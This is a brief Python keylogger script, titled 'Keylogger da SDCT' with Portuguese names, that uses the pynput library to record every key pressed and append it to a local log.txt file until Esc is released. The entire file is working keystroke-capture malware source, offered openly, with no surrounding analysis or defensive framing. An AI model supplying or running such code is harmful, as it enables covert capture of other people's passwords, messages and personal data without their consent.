#Keylogger da SDCT:
import pynput
from pynput.keyboard import Key, Listener

def salvar_tecla_no_log(tecla):
    with open("log.txt", "a") as arquivo_log:
        arquivo_log.write(tecla)

def ao_pressionar(tecla):
    try:
        salvar_tecla_no_log(str(tecla.char))
    except AttributeError:
        salvar_tecla_no_log(f"[{tecla}]")

def ao_soltar(tecla):
    if tecla == Key.esc:
        return False

def main():
    with Listener(on_press=ao_pressionar, on_release=ao_soltar) as ouvinte:
        ouvinte.join()

if __name__ == "__main__":
    main()
